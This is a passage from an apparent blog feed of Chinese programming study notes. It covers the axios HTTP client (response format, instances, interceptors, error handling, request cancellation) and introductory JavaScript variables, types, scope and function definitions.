>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br><span>124</span><br><span>125</span><br><span>126</span><br><span>127</span><br><span>128</span><br><span>129</span><br><span>130</span><br><span>131</span><br><span>132</span><br><span>133</span><br></div></div><h3 id="响应结构" tabindex="-1"> 响应结构</h3>
<p>某个请求的响应包含以下信息</p>
<div><pre><code><span>{</span>
  <span>// `data` 由服务器提供的响应</span>
  <span>data</span><span>:</span> <span>{</span><span>}</span><span>,</span>

  <span>// `status` 来自服务器响应的 HTTP 状态码</span>
  <span>status</span><span>:</span> <span>200</span><span>,</span>

  <span>// `statusText` 来自服务器响应的 HTTP 状态信息</span>
  <span>statusText</span><span>:</span> <span>'OK'</span><span>,</span>

  <span>// `headers` 服务器响应的头</span>
  <span>headers</span><span>:</span> <span>{</span><span>}</span><span>,</span>

   <span>// `config` 是为请求提供的配置信息</span>
  <span>config</span><span>:</span> <span>{</span><span>}</span><span>,</span>
 <span>// 'request'</span>
  <span>// `request` is the request that generated this response</span>
  <span>// It is the last ClientRequest instance in node.js (in redirects)</span>
  <span>// and an XMLHttpRequest instance the browser</span>
  <span>request</span><span>:</span> <span>{</span><span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div><p>使用 then 时，你将接收下面这样的响应 :</p>
<div><pre><code>axios<span>.</span><span>get</span><span>(</span><span>'/user/12345'</span><span>)</span>
  <span>.</span><span>then</span><span>(</span><span>function</span><span>(</span><span>response</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span>response<span>.</span>data<span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>response<span>.</span>status<span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>response<span>.</span>statusText<span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>response<span>.</span>headers<span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>response<span>.</span>config<span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
</code></pre></div><p>在使用 catch 时，或传递 rejection callback 作为 then 的第二个参数时，响应可以通过 error 对象可被使用。</p>
<h2 id="创建实例" tabindex="-1"> 创建实例</h2>
<p>可以使用自定义配置新建一个 <strong>axios 实例</strong></p>
<p>axios.create([config])</p>
<h3 id="实例方法" tabindex="-1"> 实例方法</h3>
<p>以下是可用的实例方法。指定的配置将与实例的配置合并</p>
<ul>
<li>axios#request(config)</li>
<li>axios#get(url[, config])</li>
<li>axios#delete(url[, config])</li>
<li>axios#head(url[, config])</li>
<li>axios#options(url[, config])</li>
<li>axios#post(url[, data[, config]])</li>
<li>axios#put(url[, data[, config]])</li>
<li>axios#patch(url[, data[, config]])</li>
</ul>
<h2 id="配置默认值" tabindex="-1"> 配置默认值</h2>
<p>可以指定将被用在各个请求的配置默认值</p>
<h3 id="全局的-axios-默认值" tabindex="-1"> 全局的 axios 默认值</h3>
<div><pre><code>axios<span>.</span>defaults<span>.</span>baseURL <span>=</span> <span>'https://api.example.com'</span><span>;</span>
axios<span>.</span>defaults<span>.</span>headers<span>.</span>common<span>[</span><span>'Authorization'</span><span>]</span> <span>=</span> <span>AUTH_TOKEN</span><span>;</span>
axios<span>.</span>defaults<span>.</span>headers<span>.</span>post<span>[</span><span>'Content-Type'</span><span>]</span> <span>=</span> <span>'application/x-www-form-urlencoded'</span><span>;</span>
</code></pre></div><h3 id="实例默认值" tabindex="-1"> 实例默认值</h3>
<div><pre><code><span>// Set config defaults when creating the instance</span>
<span>const</span> instance <span>=</span> axios<span>.</span><span>create</span><span>(</span><span>{</span>
  <span>baseURL</span><span>:</span> <span>'https://api.example.com'</span>
<span>}</span><span>)</span><span>;</span>

<span>// Alter defaults after instance has been created</span>
instance<span>.</span>defaults<span>.</span>headers<span>.</span>common<span>[</span><span>'Authorization'</span><span>]</span> <span>=</span> <span>AUTH_TOKEN</span><span>;</span>
</code></pre></div><h3 id="配置的优先顺序" tabindex="-1"> 配置的优先顺序</h3>
<p>配置会以一个优先顺序进行合并。这个顺序是：在 lib/defaults.js 找到的库的默认值，然后是实例的 defaults 属性，最后是请求的 config 参数。后者将优先于前者。</p>
<h2 id="数据处理" tabindex="-1"> 数据处理</h2>
<h3 id="拦截器" tabindex="-1"> 拦截器</h3>
<p>在请求或响应被 then 或 catch 处理前拦截它们</p>
<div><pre><code><span>// 添加请求拦截器</span>
axios<span>.</span>interceptors<span>.</span>request<span>.</span><span>use</span><span>(</span><span>function</span> <span>(</span><span>config</span><span>)</span> <span>{</span>
    <span>// 在发送请求之前做些什么</span>
    <span>return</span> config<span>;</span>
  <span>}</span><span>,</span> <span>function</span> <span>(</span><span>error</span><span>)</span> <span>{</span>
    <span>// 对请求错误做些什么</span>
    <span>return</span> Promise<span>.</span><span>reject</span><span>(</span>error<span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>

<span>// 添加响应拦截器</span>
axios<span>.</span>interceptors<span>.</span>response<span>.</span><span>use</span><span>(</span><span>function</span> <span>(</span><span>response</span><span>)</span> <span>{</span>
    <span>// 对响应数据做点什么</span>
    <span>return</span> response<span>;</span>
  <span>}</span><span>,</span> <span>function</span> <span>(</span><span>error</span><span>)</span> <span>{</span>
    <span>// 对响应错误做点什么</span>
    <span>return</span> Promise<span>.</span><span>reject</span><span>(</span>error<span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div><p>如果想在稍后移除拦截器，可以这样：</p>
<div><pre><code><span>const</span> myInterceptor <span>=</span> axios<span>.</span>interceptors<span>.</span>request<span>.</span><span>use</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span><span>/*...*/</span><span>}</span><span>)</span><span>;</span>
axios<span>.</span>interceptors<span>.</span>request<span>.</span><span>eject</span><span>(</span>myInterceptor<span>)</span><span>;</span>
</code></pre></div><p>可以为自定义 axios 实例添加拦截器</p>
<div><pre><code><span>const</span> instance <span>=</span> axios<span>.</span><span>create</span><span>(</span><span>)</span><span>;</span>
instance<span>.</span>interceptors<span>.</span>request<span>.</span><span>use</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span><span>/*...*/</span><span>}</span><span>)</span><span>;</span>
</code></pre></div><h3 id="错误处理" tabindex="-1"> 错误处理</h3>
<div><pre><code>axios<span>.</span><span>get</span><span>(</span><span>'/user/12345'</span><span>)</span>
  <span>.</span><span>catch</span><span>(</span><span>function</span> <span>(</span><span>error</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>error<span>.</span>response<span>)</span> <span>{</span>
      <span>// The request was made and the server responded with a status code</span>
      <span>// that falls out of the range of 2xx</span>
      console<span>.</span><span>log</span><span>(</span>error<span>.</span>response<span>.</span>data<span>)</span><span>;</span>
      console<span>.</span><span>log</span><span>(</span>error<span>.</span>response<span>.</span>status<span>)</span><span>;</span>
      console<span>.</span><span>log</span><span>(</span>error<span>.</span>response<span>.</span>headers<span>)</span><span>;</span>
    <span>}</span> <span>else</span> <span>if</span> <span>(</span>error<span>.</span>request<span>)</span> <span>{</span>
      <span>// The request was made but no response was received</span>
      <span>// `error.request` is an instance of XMLHttpRequest in the browser and an instance of</span>
      <span>// http.ClientRequest in node.js</span>
      console<span>.</span><span>log</span><span>(</span>error<span>.</span>request<span>)</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>// Something happened in setting up the request that triggered an Error</span>
      console<span>.</span><span>log</span><span>(</span><span>'Error'</span><span>,</span> error<span>.</span>message<span>)</span><span>;</span>
    <span>}</span>
    console<span>.</span><span>log</span><span>(</span>error<span>.</span>config<span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><p>也可以使用 validateStatus 配置选项定义一个自定义 HTTP 状态码的错误范围。</p>
<div><pre><code>axios<span>.</span><span>get</span><span>(</span><span>'/user/12345'</span><span>,</span> <span>{</span>
  <span>validateStatus</span><span>:</span> <span>function</span> <span>(</span><span>status</span><span>)</span> <span>{</span>
    <span>return</span> status <span>&lt;</span> <span>500</span><span>;</span> <span>// Reject only if the status code is greater than or equal to 500</span>
  <span>}</span>
<span>}</span><span>)</span>
</code></pre></div><h3 id="取消" tabindex="-1"> 取消</h3>
<p>使用 cancel token 取消请求</p>
<blockquote>
<p>Axios 的 cancel token API 基于cancelable promises proposal，它还处于第一阶段。</p>
</blockquote>
<p>可以使用 CancelToken.source 工厂方法创建 cancel token，像这样</p>
<div><pre><code><span>const</span> CancelToken <span>=</span> axios<span>.</span>CancelToken<span>;</span>
<span>const</span> source <span>=</span> CancelToken<span>.</span><span>source</span><span>(</span><span>)</span><span>;</span>

axios<span>.</span><span>get</span><span>(</span><span>'/user/12345'</span><span>,</span> <span>{</span>
  <span>cancelToken</span><span>:</span> source<span>.</span>token
<span>}</span><span>)</span><span>.</span><span>catch</span><span>(</span><span>function</span><span>(</span><span>thrown</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>axios<span>.</span><span>isCancel</span><span>(</span>thrown<span>)</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'Request canceled'</span><span>,</span> thrown<span>.</span>message<span>)</span><span>;</span>
  <span>}</span> <span>else</span> <span>{</span>
     <span>// 处理错误</span>
  <span>}</span>
<span>}</span><span>)</span><span>;</span>

axios<span>.</span><span>post</span><span>(</span><span>'/user/12345'</span><span>,</span> <span>{</span>
  <span>name</span><span>:</span> <span>'new name'</span>
<span>}</span><span>,</span> <span>{</span>
  <span>cancelToken</span><span>:</span> source<span>.</span>token
<span>}</span><span>)</span>

<span>// 取消请求（message 参数是可选的）</span>
source<span>.</span><span>cancel</span><span>(</span><span>'Operation canceled by the user.'</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div><p>还可以通过传递一个 executor 函数到 CancelToken 的构造函数来创建 cancel token：</p>
<div><pre><code><span>const</span> CancelToken <span>=</span> axios<span>.</span>CancelToken<span>;</span>
<span>let</span> cancel<span>;</span>

axios<span>.</span><span>get</span><span>(</span><span>'/user/12345'</span><span>,</span> <span>{</span>
  <span>cancelToken</span><span>:</span> <span>new</span> <span>CancelToken</span><span>(</span><span>function</span> <span>executor</span><span>(</span><span>c</span><span>)</span> <span>{</span>
    <span>// executor 函数接收一个 cancel 函数作为参数</span>
    cancel <span>=</span> c<span>;</span>
  <span>}</span><span>)</span>
<span>}</span><span>)</span><span>;</span>

<span>// cancel the request</span>
<span>cancel</span><span>(</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><p><strong>注意</strong>: 可以使用同一个 cancel token 取消多个请求</p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">JavaScript</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%89%8D%E7%AB%AF/JavaScript.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%89%8D%E7%AB%AF/JavaScript.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li></li>
</ul>

<h1 id="javascript" tabindex="-1"> JavaScript</h1>
<h2 id="javascript-简介" tabindex="-1"> JavaScript 简介</h2>
<p>JavaScript 是一种脚本，一门编程语言，它可以在网页上实现复杂的功能，网页展现给你的不再是简单的静态信息，而是实时的内容更新。</p>
<p><strong>JavaScript语言的介绍</strong>：JavaScript是基于对象和原型的一种动态、弱类型的脚本语言</p>
<p><strong>JavaScript语言的组成</strong>：JavaScript是由核心语法(ECMAScript)、文档对象模型(DOM)、浏览器对象模型(BOM)组成的</p>
<h1 id="javascript-语法" tabindex="-1"> JavaScript 语法</h1>
<h2 id="基础语法" tabindex="-1"> 基础语法</h2>
<h3 id="变量" tabindex="-1"> 变量</h3>
<p><strong>变量的声明</strong></p>
<ul>
<li>var变量：var 变量名 = 值;
<ul>
<li>存在变量声明提前,可声明同名变量覆盖。</li>
</ul>
</li>
<li>let变量：let 变量名 = 值;
<ul>
<li>存在暂时性死区，不存在变量声明提前，不允许重复定义</li>
</ul>
</li>
<li>const变量：const 变量名 = 值;
<ul>
<li>使用时必须初始化(即必须赋值)，存在暂时性死区，不存在变量声明提前，不允许重复定义</li>
</ul>
</li>
</ul>
<p><strong>暂时性死区</strong>：只要一进入当前作用域，所要使用的变量就已经存在了，但是不可获取，只有等到声明变量的那一行代码出现，才可以获取和使用该变量</p>
<p><strong>变量声明提升</strong>：变量在声明之前就访问，var会使用默认值undefined，而let会直接报错</p>
<p><strong>隐式变量</strong>是指没有用var，let，const等关键字定义的变量，隐式变量是不存在变量提升</p>
<p><strong>变量声明方式区别</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>var</th>
<th>let</th>
<th>const</th>
</tr>
</thead>
<tbody>
<tr>
<td>是否必须显式声明</td>
<td>否</td>
<td>是</td>
<td>是</td>
</tr>
<tr>
<td>是否可重复声明</td>
<td>是</td>
<td>否</td>
<td>否</td>
</tr>
<tr>
<td>是否可修改</td>
<td>是</td>
<td>是</td>
<td>基本数据类型不可，引用类型可以</td>
</tr>
<tr>
<td>作用域</td>
<td>全局/函数</td>
<td>块级</td>
<td>块级</td>
</tr>
<tr>
<td>暂时性死区</td>
<td>否</td>
<td>是</td>
<td>是</td>
</tr>
<tr>
<td>变量提升</td>
<td>是</td>
<td>否</td>
<td>否</td>
</tr>
</tbody>
</table>
<h3 id="数据类型" tabindex="-1"> 数据类型</h3>
<p>数据类型判断 typeof</p>
<p><strong>原始类型</strong>(基本类型)：值不可变(原始值)</p>
<ul>
<li>Number 表示所有的数值类型，数值范围在(Number.MIN_VALUE~Number.MAX_VALUE)之间，超出范围会自动转化为[-+]Infinity(无穷)，NaN是一个非数值</li>
<li>String 表示一个字符串，其他类型可以使用toString方法转为字符串</li>
<li>Boolean 布尔类型 只有true和false两个值</li>
<li>Null 只有一个值null，表示一个空指针对象，因此我们应该将保存对象的变量初始化为null</li>
<li>Undefined 未定义（声明了是var变量，但是没有赋值的时候）</li>
<li>Symbol类型：表示一个符号，符号类型是唯一的并且是不可修改的</li>
</ul>
<p><strong>引用类型</strong>：值可变</p>
<ul>
<li>引用类型是一种数据结构，用于将数据和功能组织在一起</li>
<li>常见引用类型：对象（Object）、数组（Array）、函数（Function）、正则（RegExp）和日期（Date）等</li>
</ul>
<h3 id="作用域" tabindex="-1"> 作用域</h3>
<p>作用域（scope）就是变量访问规则的有效范围。</p>
<ul>
<li>作用域外，无法引用作用域内的变量；</li>
<li>离开作用域后，作用域的变量的内存空间会被清除，比如执行完函数或者关闭浏览器</li>
<li>作用域与执行上下文是完全不同的两个概念。</li>
</ul>
<h4 id="执行期上下文" tabindex="-1"> 执行期上下文</h4>
<p>当函数执行时，会创建一个称为执行期上下文的内部对象。一个执行期上下文定义了一个函数执行时的环境，函数每次执行时对应的执行上下文都是独一无二的，所以多次调用一个函数会导致创建多个执行上下文，当函数执行完毕，执行上下文被销毁。</p>
<p>JavaScript代码的整个执行过程，分为两个阶段，代码编译阶段与代码执行阶段。</p>
<ul>
<li>编译阶段由编译器完成，将代码翻译成可执行代码，这个阶段作用域规则会确定。</li>
<li>执行阶段由引擎完成，主要任务是执行可执行代码，执行上下文在这个阶段创建。</li>
</ul>
<h4 id="变量作用域" tabindex="-1"> 变量作用域</h4>
<p><strong>全局作用域</strong>：在所有函数声明或者{}之外定义的变量，都在全局作用域里。一旦声明一个全局变量，在任何地方都可以使用它。</p>
<ul>
<li>在函数中，如果不加 var 声明一个变量，那么这个变量会默认被声明为全局变量，如果是严格模式，则会报错。</li>
<li>全局变量会造成命名污染，如果在多处对同一个全局变量进行操作，那么久会覆盖全局变量的定义。同时全局变量数量过多，非常不方便管理。
<strong>局部作用域</strong>：一般只在固定的代码片段内可访问到，而其外部是无法访问的，它分为函数作用域和块级作用域</li>
<li><strong>函数作用域</strong>：在函数中定义一个局部变量，那么该变量只可以在该函数作用域中被访问
<ul>
<li>嵌套函数作用域：在外层函数中，嵌套一个内层函数，那么这个内层函数可以向上访问到外层函数中的变量。</li>
</ul>
</li>
<li><strong>块级作用域</strong>：{}包裹的区域内生命的let/const变量，只能在{}内部使用这一变量
<ul>
<li>块作用域内定义的函数在块作用域内会进行函数提升，提升到最上面，然后在最外层类似于var声明一个同名变量，默认值为undefined。</li>
</ul>
</li>
</ul>
<h4 id="词法作用域" tabindex="-1"> 词法作用域</h4>
<p>词法作用域，也可以叫做静态作用域。意思是无论函数在哪里调用，词法作用域都只在由函数被声明时所处的位置决定。</p>
<p>动态作用域的作用域则是由函数被调用时执行的位置所决定。</p>
<p>JS的作用域是静态作用域</p>
<h4 id="作用域链" tabindex="-1"> 作用域链</h4>
<p><strong>作用域链</strong>：[[scope]]中所存储的执行期上下文对象的集合，这个集合呈链式链接，我们把这种链式链接叫做作用域链。</p>
<p>在JS引擎中，通过标识符查找标识符的值，会从当前作用域向上查找，直到作用域找到第一个匹配的标识符位置。就是JS的作用域链。</p>
<h4 id="闭包" tabindex="-1"> 闭包</h4>
<p>有权访问另一个函数作用域中的变量的函数</p>
<h3 id="运算符" tabindex="-1"> 运算符</h3>
<ul>
<li>算数运算符：加(+)，减(-)，乘(*)，除(/)，求余(%)</li>
<li>赋值运算符：=，+=，-=，*=，%=</li>
<li>关系运算符：&gt;，&lt;，&gt;=，&lt;=，<mark>(只比较值)，!=，</mark>=(值和数据类型都比较)</li>
<li>逻辑运算符：<a href="%E5%8F%AA%E6%9C%89%E5%B7%A6%E4%BE%A7%E6%BB%A1%E8%B6%B3%E6%89%8D%E8%AE%A1%E7%AE%97%E5%8F%B3%E4%BE%A7">&amp;&amp;，||</a>，！,<a href="%E4%B8%8D%E7%AE%A1%E5%B7%A6%E4%BE%A7%E7%BB%93%E6%9E%9C%E5%A6%82%E4%BD%95%EF%BC%8C%E9%83%BD%E8%A6%81%E8%AE%A1%E7%AE%97%E5%8F%B3%E4%BE%A7">&amp;，|</a></li>
<li>三目运算符：(表达式) ? 值1，值2；</li>
</ul>
<p><strong>注意</strong></p>
<ul>
<li>没有除0异常，除零会出现正负无穷大（Infinity）</li>
<li>如果进行了非法的数学运算，结果是NaN(not a Number) 包括字符串转换类型失败时，结果也是NaN</li>
<li>js中的 == 比较的是值（不同类型的值会转换后比较）</li>
</ul>
<p><strong>数据转换</strong>：</p>
<ul>
<li>... --&gt; boolean
<ul>
<li>string 数字：对应number</li>
<li>string 非数字：NaN(number类型)</li>
<li>boolean true： 1</li>
<li>boolean false：0</li>
<li>object 有具体： 1</li>
<li>object null： 0</li>
</ul>
</li>
<li>... --&gt; number
<ul>
<li>number 非0： true</li>
<li>number 0： false</li>
<li>string 非空字符串 : true</li>
<li>string 空字符串 &quot;&quot;: false</li>
<li>object 具体的对象 : true</li>
<li>object null : false</li>
<li>声明不赋值的变量 : false</li>
</ul>
</li>
</ul>
<h3 id="流程控制" tabindex="-1"> 流程控制</h3>
<ul>
<li>条件分支语句：if语句，switch语句</li>
<li>循环语句：while循环，do while循环，for循环，for-in循环</li>
</ul>
<h2 id="函数" tabindex="-1"> 函数</h2>
<p><strong>函数的概念</strong>：具有独立功能的代码块。在js中使用function关键字定义函数</p>
<p><strong>函数的作用</strong>：让代码结构更加清晰，提高代码重用性和可移植性</p>
<p><strong>js函数的分类</strong>：自定义函数和系统函数</p>
<h3 id="自定义函数" tabindex="-1"> 自定义函数</h3>
<h4 id="函数的创建" tabindex="-1"> 函数的创建</h4>
<ol>
<li>函数声明
<ul>
<li>格式：function 函数名( [参数列表] ) { 要执行的代码 }</li>
<li>特点：预编译时会解释声明，所以在函数声明前后都可以调用函数</li>
</ul>
</li>
<li>函数表达式
<ul>
<li>格式：var 函数名 = function( [参数列表] ) { 要执行的代码 };</li>
<li>特点：系统只有加载到该函数时才会声明，所以只能在函数声明后调用</li>
</ul>
</li>
<li>函数构造函数
<ul>
<li>格式：var 函数名 = new Function( [&quot;参数列表&quot;],&quot; { 要执行的代码 }&quot; )</li>
<li>注意：此声明表明在js中函数是作为对象存在的。”形参”是作为实参存在</li>
</ul>
</li>
<li>属性函数：属性名 : function( [参数列表] ) { 要执行的代码 }</li>
</ol>
<p><strong>总结</strong>：</p>
<ul>
<li>第一种和第二种函数的定义的方式其实是第三种 new Function 的语法糖，当我们定义函数时候都会通过 new Function 来创建一个函数，只是前两种进行了封装，js 中任意函数都是Function 的实例。</li>
<li>使用构造函数Function()创建的函数不使用词法作用域，相反的，它们总是被顶级函数来编译</li>
<li>ECMAScript 定义的函数实际上是功能完整的对象。</li>
</ul>
<div><pre><code><span>// 1. 函数声明</span>
<span>function</span> <span>create1</span><span>(</span><span>)</span> <span>{</span>
    <span>alert</span><span>(</span><span>"函数声明"</span><span>)</span><span>;</span>
<span>}</span>
<span>create1</span><span>(</span><span>)</span><span>;</span>

<span>// 2. 函数表达式</span>
<span>var</span> <span>create2</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>alert</span><span>(</span><span>"函数表达式"</span><span>)</span><span>;</span>
<span>}</span><span>;</span>
<span>create2</span><span>(</span><span>)</span><span>;</span>

<span>// 3. 函数构造函数</span>
<span>var</span> create3 <span>=</span> <span>new</span> <span>Function</span><span>(</span><span>'{alert("函数构造函数");}'</span><span>)</span><span>;</span> 

<span>//4. 属性函数</span>
<span>var</span> People <span>=</span> <span>{</span>
    <span>name</span> <span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
        console<span>.</span><span>log</span><span>(</span><span>"对象函数属性1"</span><span>)</span><span>;</span>
    <span>}</span><span>,</span>
    <span>age</span> <span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
        console<span>.</span><span>log</span><span>(</span><span>"对象函数属性2"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
People<span>.</span><span>name</span><span>(</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div><h4 id="函数的调用" tabindex="-1"> 函数的调用</h4>
<ol>
<li>
<p>函数调用模式</p>
<ul>
<li>函数声明后直接调用，一般是由函数声明和函数表达式创建的函数</li>
<li>this指向window对象</li>
</ul>
</li>
<li>
<p>方法调用模式</p>
<ul>
<li>对象调用属性函数，一般是由属性函数创建的函数</li>
<li>this指向当前对象</li>
</ul>
</li>
<li>
<p>构造器调用模式</p>
<ul>
<li>必须实例化对象后才能调用其原型方法</li>
<li>如果没有return则返回this，this指向当前实例化对象；如果有return则返回return的值</li>
</ul>
</li>
<li>
<p>apply调用模式</p>
<ul>
<li>apply和call第一个如果使用null就是函数模式，使用对象就是方法模式</li>
<li>apply第二个参数是传入一个参数数组，call的参数是直接传入</li>
</ul>
</li>
<li>
<p>事件响应调用</p>
<ul>
<li>在HTML标签的事件属性中调用: <code>&lt;input type=&quot;button&quot; value=&quot;点我测试&quot; onclick=&quot;函数名()&quot; /&gt;</code></li>
<li>在js事件响应中调用: DOM对象.onclick = function(){要执行的代码}</li>
<li>在js事件监听中调用: DOM对象.addEventListener(onclick，function(){要执行的代码}, false);</li>
</ul>
</li>
<li>
<p>超链接调用: <code>&lt;a href=&quot;javascript: 函数名()&quot;&gt;超链接调用&lt;/a&gt;</code></p>
</li>
</ol>
<div><pre><code><span>// 1. 函数调用模式</span>
<span>function</span> <span>funCall1</span><span>(</span><span>)</span> <span>{</span>
    <span>alert</span><span>(</span><span>"函数调用模式1：函数声明"</span><span>)</span><span>;</span>
<span>}</span>
<span>funCall1</span><span>(</span><span>)</span><span>;</span>

<span>var</span> <span>funCall2</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>alert</span><span>(</span><span>"函数调用模式2：函数表达式"</span><span>)</span><span>;</span>
<span>}</span><span>;</span>
<span>funCall2</span><span>(</span><span>)</span><span>;</span>

<span>// 2. 方法调用模式</span>
<span>var</span> Menthods <span>=</span> <span>{</span>
    <span>filed</span> <span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
        <span>alert</span><span>(</span><span>"方法调用模式：属性函数"</span><span>)</span>
    <span>}</span>
<span>}</span>
Menthods<span>.</span><span>filed</span><span>(</span><span>)</span><span>;</span>

<span>// 3. 构造器调用模式</span>
<span>function</span> <span>Fileds</span><span>(</span><span>name<span>,</span> value</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
    <span>this</span><span>.</span>value <span>=</span> value<span>;</span>
    <span>this</span><span>.</span><span>sayHello</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>this</span><span>.</span>name <span>+</span> <span>":"</span> <span>+</span> <span>this</span><span>.</span>value<span>;</span>
    <span>}</span>
<span>}</span>
<span>var</span> filed <span>=</span> <span>new</span> <span>Fileds</span><span>(</span><span>"address"</span><span>,</span> <span>"高老庄"</span><span>)</span><span>;</span>
filed<span>.</span><span>sayHello</span><span>(</span><span>)</span><span>;</span>

<span>// 4. apply调用模式</span>
<span>function</span> <span>add</span><span>(</span><span>a<span>,</span> b</span><span>)</span> <span>{</span>
    <span>return</span> a <span>+</span> b<span>;</span>
<span>}</span>
console<span>.</span><span>log</span><span>(</span><span>add</span><span>.</span><span>apply</span><span>(</span>add<span>,</span> <span>[</span> <span>2</span><span>,</span> <span>3</span> <span>]</span><span>)</span><span>)</span><span>;</span> <span>// apply调用模式</span>
console<span>.</span><span>log</span><span>(</span><span>add</span><span>.</span><span>call</span><span>(</span>add<span>,</span> <span>2</span><span>,</span> <span>3</span><span>)</span><span>)</span><span>;</span> <span>// call调用模式</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br></div></div><h4 id="匿名函数" tabindex="-1"> 匿名函数</h4>
<p>没有名字的函数，创建闭包，避免造成全局变量的污染</p>
<p><strong>使用场景</strong>：函数表达式、对象属性、事件及其参数，返回值</p>
<div><pre><code>window<span>.</span><span>onload</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>// 1. 函数表达式</span>
